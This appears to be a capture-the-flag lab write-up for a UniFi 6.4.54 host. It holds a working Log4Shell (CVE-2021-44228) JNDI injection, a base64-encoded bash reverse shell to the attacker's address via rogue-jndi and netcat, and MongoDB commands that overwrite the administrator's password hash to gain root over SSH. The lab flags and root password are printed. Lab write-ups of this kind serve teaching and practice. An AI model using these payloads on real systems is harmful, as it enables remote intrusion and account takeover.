@@ -1,0 +1,134 @@
+We start with Nmap scan:sudo nmap -sC -sV -p- --min-rate 5000 (target ip).
+
+We get four tcp ports open: 22 which is ssh, 6789, 8080 which is http, and 8443.
+
+We will see what website is running on this port: (target ip):8080 on our url search bar.
+
+
+
+We will be met with a login form. Maybe we can use SQLi on it.
+
+Unfortunatily, this login page doesnt have any cookies that have been set, so we cant try the sqlmap tool on it.
+
+We notice something that could be useful, the version number of the service that is running this login page which is Unifi version: 6.4.54 . If we do a simple Google search for any exploit that this particular verison might have, we indeed come up with this exploit: CVE-2021-44228. 
+
+This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection),
+which is a web security vulnerability that allows an attacker to execute arbitrary operating system
+commands on the server that is running the application and typically fully compromise the application and
+all its data.
+
+We will use BurbSuite to capture a post request when logging in as with test:test.
+
+We will send the Post request that we captures to the repeater. In the repeater tab, we will change the remember parameter to the following: "${jndi:ldap://(our ip address)/whatever}" . Because the POST data is being sent as a JSON object and because the payload contains brackets {} , in order to prevent it from being parsed as another JSON object we enclose it inside brackets " so that it is parsed as a string instead . 
+
+JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
+applications locate resources and other program objects. A resource is a program object that provides
+connections to systems, such as database servers and messaging systems.
+
+LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
+industry standard application protocol for accessing and maintaining distributed directory information
+services over the Internet or a Network. The default port that LDAP runs on is port 389 .
+
+If we click send, we will have an error message in the response pane. This is good NEWS as this is a decleration that it is indeed vulnertable to OS Command Injection.
+
+Let's proceed to starting tcpdump on port 389 , which will monitor the network traffic for LDAP
+connections.
+
+tcpdump is a data-network packet analyzer computer program that runs under a command
+line interface. It allows the user to display TCP/IP and other packets being
+transmitted or received over a network to which the computer is attached.
+
+In a new terminal, we will do: sudo tcpdump -i tun0 port 389 .
+
+After we start the tcpdump, we will again press send in BurbSuit.
+
+The tcpdump output shows a connection being received on our machine. This proves that the application is
+indeed vulnerable since it is trying to connect back to us on the LDAP port 389.
+
+We will need to install open-JDK and Maven.
+
+We will use a Github repository that will exploit this vulnerability, so we do: git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi .
+Then, we will build the package using Maven: mvn package.
+
+This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can
+construct our payload to pass into the RogueJndi-1-1.jar Java application.
+
+To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for
+giving us a shell on the affected system. We will be using the Base64 encoding as the payload to prevent any encoding
+issues: echo 'bash -c bash -i >&/dev/tcp/(our IP Address)/(any port of our choice) 0>&1' |
+base64. This will create us a Base64 encoded text, in my case:YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuOTMvNDQ0NCAwPiYxCg== .
+
+Then we will do: java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|{base64,-d}|{bash,-i}" --hostname "{ Our IP Address}".
+
+Note: make sure that there are no white spaces before and after the pipe in the previous command.
+
+
+
+Now, we will run netcat on the port that we chose earlier: nc -lvp (port number). 
+
+After that, we will change the payload on BurbSuite to: "${jndi:ldap://(our ip address):1389/o=tomcat}" . Then, we send.
+
+We will notice that we now have a reverse shell in netcat terminal. We can
+upgrade the terminal shell using the following command: script /dev/null -c bash .
+
+We can find the user flag under: /home/michael/user.txt
+
+user flag: 6ced1a6a89e666c0620cdb10262ba127.
+
+---------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------
+
+Privilege Escalation:
+
+First let's check if MongoDB is running on the target system,
+which might make it possible for us to extract credentials in order to login to the administrative panel: ps aux | grep mongo . Mongo is running on port 27117
+
+Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to
+extract the administrator password. A quick Google search using the keywords UniFi Default Database
+shows that the default database name for the UniFi application is ace : mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+We will find the the administrator name and password but hashed. We will use hashcat to crack this hash, but first we need to know what kind of hash it is being used in this case.
+
+We will go to this website: https://hashcat.net/wiki/doku.php?id=example_hashes. There, we will compare the format of the hash that we found with examples. The hash that we found started with: $6$. This hash has the code of 1800 in the list.
+
+Now, we just need to save the hash text in a text file.
+
+Now, that we have the hash text and the code of the hash, we will use hash cat like this: hashcat -m (hash code) (hash file path) (password list path).
+
+However, hashcat is not going to find the password in the password list, so this way is not going to work.
+
+We can change the password ourselves. To generate a hashkey of the password: pass123, we will do the following: mkpasswd -m sha-512 pass123 .We have used sha-512 because this is the same hash that is used for the original password.
+
+Now, we can change the password in the mongo database by: mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
+
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id":
+ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$1hns8p8iYj0xsKnZ$HPMP.mZjPHkRqlrelJW4JDTbEogfH085nYLv1Ptafyar0E9PqoL/kSuMnB4vFJFlE4ixst4lGUhG4Ukty3w0U1"}})'
+
+Now, if we go to the website and we used these credentials: administrator:pass123, we will log in as admin.
+
+UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other
+Access Points over SSH from a console or terminal.
+Navigate to settings -> site and scroll down to find the SSH Authentication setting. SSH authentication
+with a root password has been enabled. 
+
+We can view the password which is: NotACrackablePassword4U2022.
+
+We will try and login using ssh. In a new terminal: ssh root@(target ip), then we use the password that we got. We are in.
+
+We will find the root flag under: /root/root.txt
+
+root flat:e50bc93c75b634e4b272d2f771c33681
+
+//END
+
+
+
+
+
+
+
+
